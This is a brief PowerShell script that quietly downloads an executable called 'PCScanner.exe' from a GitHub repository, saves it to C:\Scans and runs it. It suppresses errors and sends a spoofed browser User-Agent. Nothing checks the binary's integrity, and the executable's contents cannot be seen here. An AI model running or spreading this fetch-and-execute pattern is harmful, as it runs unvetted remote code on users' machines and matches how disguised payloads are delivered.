$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

try {
    # Create scans directory if it doesn't exist
    $scanDir = "C:\Scans"
    if (-not (Test-Path $scanDir)) {
        New-Item -ItemType Directory -Path $scanDir | Out-Null
    }

    # Set up secure web client
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    
    # Download file to scans directory
    $scannerPath = Join-Path $scanDir "PCScanner.exe"
    $webClient.DownloadFile("https://raw.githubusercontent.com/RevScreenShare/HayabusaTool/refs/heads/main/PCScanner.exe", $scannerPath)
    
    # Execute scanner
    Start-Process -FilePath $scannerPath -WindowStyle Normal
    
} catch {
    $errorMessage = $_.Exception.Message
    Write-Host "Error: $errorMessage"
    Write-Host "Unable to download or run the scanner. Please check your internet connection and file path."
} 